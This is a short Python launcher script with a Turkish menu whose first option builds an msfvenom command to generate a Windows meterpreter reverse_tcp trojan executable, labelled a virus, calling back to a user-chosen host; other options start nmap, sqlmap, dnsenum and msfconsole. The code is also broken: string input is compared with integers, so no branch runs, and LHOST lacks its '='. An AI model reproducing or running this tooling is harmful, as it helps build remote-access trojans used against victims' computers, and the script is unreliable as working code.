import os 

os.system("clear")

banner="""
------------
𝔚𝔈𝔅ℭ𝔑𝔖
------------
"""
print(banner)

print("""
1)trojan yapma
2)nmap vuln scanner
3)sqlmap
4)ip tarama
5)payload
""")
veri=input("----->")

if veri == 1 :

     ip=input("cihaz kimligini giriniz:")
     port=input("portu giriniz:")
     ismin=input("virüs ismi:")
     os.system("clear && msfvenom -p windows/meterpreter/reverse_tcp LHOST"+ip+" LPORT="+port+" -f exe -o "+ismin)

if veri == 2 :
     os.system("nmap")

if veri == 3 :
     os.system("sqlmap")

if veri == 4 :
     os.system("dnsenum")

if veri == 5 :
     os.system("msfconsole")
